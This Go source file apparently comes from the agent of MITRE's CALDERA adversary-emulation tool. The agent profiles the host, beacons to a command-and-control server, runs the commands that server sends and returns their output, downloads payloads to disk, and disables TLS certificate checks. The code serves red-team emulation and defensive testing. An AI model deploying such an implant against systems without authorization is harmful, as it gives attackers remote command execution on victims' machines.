package agent

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"sync"
	"time"

	"github.com/mitre/gocat/contact"
	"github.com/mitre/gocat/execute"
	"github.com/mitre/gocat/output"
	"github.com/mitre/gocat/privdetect"
	"github.com/mitre/gocat/proxy"
)

type AgentInterface interface {
	Heartbeat()
	Beacon() map[string]interface{}
	Initialize(server string, group string, c2Config map[string]string, enableP2pReceivers bool) error
	RunInstruction(command map[string]interface{}, payloads []string)
	Terminate()
	GetFullProfile() map[string]interface{}
	GetTrimmedProfile() map[string]interface{}
	SetCommunicationChannels(c2Config map[string]string) error
	Display()
	DownloadPayloads(payloads []interface{}) []string
	FetchPayloadBytes(payload string) []byte
	ActivateP2pReceivers()
	TerminateP2pReceivers()
}

// Implements AgentInterface
type Agent struct {
	// Profile fields
	server string
	group string
	host string
	username string
	architecture string
	platform string
	location string
	pid int
	ppid int
	executors []string
	privilege string
	exe_name string
	paw string
	initialDelay float64

	// Communication methods
	beaconContact contact.Contact
	heartbeatContact contact.Contact
	defaultC2 string // Default C2 channel name

	// peer-to-peer info
	enableP2pReceivers bool
	p2pReceiverWaitGroup *sync.WaitGroup
	validP2pReceivers map[string]proxy.P2pReceiver
	p2pReceiverAddresses [][]string
}

// Set up agent variables.
func (a *Agent) Initialize(server string, group string, c2Config map[string]string, enableP2pReceivers bool, initialDelay int, paw string) error {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	host, err := os.Hostname()
	if err != nil {
		return err
	}
	if userName, err := getUsername(); err == nil {
		a.username = userName
	} else {
		return err
	}
	a.server = server
	a.group = group
	a.host = host
	a.architecture = runtime.GOARCH
	a.platform = runtime.GOOS
	a.location = os.Args[0]
	a.pid = os.Getpid()
	a.ppid = os.Getppid()
	a.executors = execute.AvailableExecutors()
	a.privilege = privdetect.Privlevel()
	a.exe_name = filepath.Base(os.Args[0])
	a.enableP2pReceivers = enableP2pReceivers
	a.initialDelay = float64(initialDelay)

	// Paw will get initialized after successful beacon if it's not specified via command line
	if paw != "" {
		a.paw = paw
	}
	// Set up contacts
	a.defaultC2 = "HTTP"
	if err = a.SetCommunicationChannels(c2Config); err != nil {
		return err
	}

	// Set up P2P receivers.
	if a.enableP2pReceivers {
		a.ActivateP2pReceivers()
		a.p2pReceiverAddresses = a.getProxyReceiverList()
	}
	return nil
}

// Returns full profile for agent.
func (a *Agent) GetFullProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw": a.paw,
		"server": a.server,
		"group": a.group,
		"host": a.host,
		"username": a.username,
		"architecture": a.architecture,
		"platform": a.platform,
		"location": a.location,
		"pid": a.pid,
		"ppid": a.ppid,
		"executors": a.executors,
		"privilege": a.privilege,
		"exe_name": a.exe_name,
		"proxy_receivers": a.p2pReceiverAddresses,
	}
}

// Return minimal subset of agent profile.
func (a *Agent) GetTrimmedProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw": a.paw,
		"server": a.server,
		"platform": a.platform,
		"host": a.host,
	}
}

// Pings C2 for instructions and returns them.
func (a *Agent) Beacon() map[string]interface{} {
	var beacon map[string]interface{}
	profile := a.GetFullProfile()
	response := a.beaconContact.GetBeaconBytes(profile)
	if response != nil {
		beacon = processBeacon(response)
	} else {
		output.VerbosePrint("[-] beacon: DEAD")
	}
	return beacon
}

// Converts the given data into a beacon with instructions.
func processBeacon(data []byte) map[string]interface{} {
	var beacon map[string]interface{}
	if err := json.Unmarshal(data, &beacon); err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Malformed beacon received: %s", err.Error()))
	} else {
		var commands interface{}
		if err := json.Unmarshal([]byte(beacon["instructions"].(string)), &commands); err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Malformed beacon instructions received: %s", err.Error()))
		} else {
			output.VerbosePrint("[+] beacon: ALIVE")
			beacon["sleep"] = int(beacon["sleep"].(float64))
			beacon["watchdog"] = int(beacon["watchdog"].(float64))
			beacon["instructions"] = commands
		}
	}
	return beacon
}

func (a *Agent) Heartbeat() {
	// Add any heartbeat functionality here.
}

func (a *Agent) Terminate() {
	// Add any cleanup/termination functionality here.
	output.VerbosePrint("[*] Terminating Sandcat Agent... goodbye.")
	if a.enableP2pReceivers {
		a.TerminateP2pReceivers()
	}
}

// Runs a single instruction and send results.
func (a *Agent) RunInstruction(command map[string]interface{}, payloads []string) {
	timeout := int(command["timeout"].(float64))
	result := make(map[string]interface{})
	commandOutput, status, pid := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), timeout)
	result["id"] = command["id"]
	result["output"] = commandOutput
	result["status"] = status
	result["pid"] = pid
 	a.beaconContact.SendExecutionResults(a.GetTrimmedProfile(), result)
}

// Sets the C2 communication channels for the agent according to the specified C2 configuration map.
// Will default to HTTP if requested C2 is not available or its requirements aren't met. If defaulting
// to HTTP when it is not available,or if no communication channels are available at all, an error will be returned.
func (a *Agent) SetCommunicationChannels(c2Config map[string]string) error {
	if len(contact.CommunicationChannels) > 0 {
		if requestedC2, ok := c2Config["c2Name"]; ok {
			if err := a.attemptSelectChannel(c2Config, requestedC2); err == nil {
				return nil
			}
		}
		return a.attemptSelectChannel(c2Config, a.defaultC2)
	}
	return errors.New("No possible C2 communication channels found.")
}

// Attempts to set a given C2 channel for the agent.
func (a *Agent) attemptSelectChannel(c2Config map[string]string, requestedChannel string) error {
	coms, ok := contact.CommunicationChannels[requestedChannel]
	if !ok {
		return errors.New(fmt.Sprintf("%s channel not available", requestedChannel))
	}
	valid, config := coms.C2RequirementsMet(a.GetFullProfile(), c2Config)
	if valid {
		if config != nil {
			a.modifyAgentConfiguration(config)
		}
		a.beaconContact = coms
		a.heartbeatContact = coms
		output.VerbosePrint(fmt.Sprintf("[*] Set C2 communication channel to %s", requestedChannel))
		return nil
	}
	return errors.New(fmt.Sprintf("%s channel available, but requirements not met.", requestedChannel))
}

// Outputs information about the agent.
func (a *Agent) Display() {
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", int(a.initialDelay)))
	output.VerbosePrint(fmt.Sprintf("server=%s", a.server))
	output.VerbosePrint(fmt.Sprintf("group=%s", a.group))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", a.privilege))
	output.VerbosePrint(fmt.Sprintf("allow p2p receivers=%v", a.enableP2pReceivers))
	output.VerbosePrint(fmt.Sprintf("beacon channel=%s", a.beaconContact.GetName()))
	output.VerbosePrint(fmt.Sprintf("heartbeat channel=%s", a.heartbeatContact.GetName()))
	if a.enableP2pReceivers {
		for receiverName, _ := range proxy.P2pReceiverChannels {
			if _, ok := a.validP2pReceivers[receiverName]; ok {
				output.VerbosePrint(fmt.Sprintf("P2p receiver %s=activated", receiverName))
			} else {
				output.VerbosePrint(fmt.Sprintf("P2p receiver %s=NOT activated", receiverName))
			}
		}
		for _, receiverInfo := range a.p2pReceiverAddresses {
			output.VerbosePrint(fmt.Sprintf("%s proxy receiver available at %s", receiverInfo[0], receiverInfo[1]))
		}
	}
}

// Will download each individual payload listed, write them to disk,
// and will return the full file paths of each downloaded payload.
func (a *Agent) DownloadPayloads(payloads []interface{}) []string {
	var droppedPayloads []string
	availablePayloads := reflect.ValueOf(payloads)
	for i := 0; i < availablePayloads.Len(); i++ {
		payload := availablePayloads.Index(i).Elem().String()
		location, err := a.WritePayloadToDisk(payload)
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] %s", err.Error()))
			continue
		}
		droppedPayloads = append(droppedPayloads, location)
	}
	return droppedPayloads
}

// Will download the specified payload and write it to disk using the filename provided by the C2.
// Returns the C2-provided filename or error.
func (a *Agent) WritePayloadToDisk(payload string) (string, error) {
	payloadBytes, filename := a.FetchPayloadBytes(payload)
	if len(payloadBytes) > 0 && len(filename) > 0 {
		location := filepath.Join(filename)
		if !fileExists(location) {
			return location, writePayloadBytes(location, payloadBytes)
		}
		output.VerbosePrint(fmt.Sprintf("[*] File %s already exists", filename))
		return location, nil
	}
	return "", errors.New(fmt.Sprintf("Failed to fetch payload bytes for payload %s",payload))
}

// Will request payload bytes from the C2 for the specified payload and return them.
func (a *Agent) FetchPayloadBytes(payload string) ([]byte, string) {
	output.VerbosePrint(fmt.Sprintf("[*] Fetching new payload bytes: %s", payload))
	return a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload)
}

func (a *Agent) Sleep(sleepTime float64) {
	time.Sleep(time.Duration(sleepTime) * time.Second)
}

func (a *Agent) GetPaw() string {
	return a.paw
}

func (a *Agent) SetPaw(paw string) {
	if len(paw) > 0 {
		a.paw = paw
	}
}

func (a *Agent) GetBeaconContact() contact.Contact {
	return a.beaconContact
}

func (a *Agent) GetHeartbeatContact() contact.Contact {
	return a.heartbeatContact
}

func (a *Agent) modifyAgentConfiguration(config map[string]string) {
	if val, ok := config["paw"]; ok {
		a.paw = val
	}
	if val, ok := config["server"]; ok {
		a.server = val
	}
}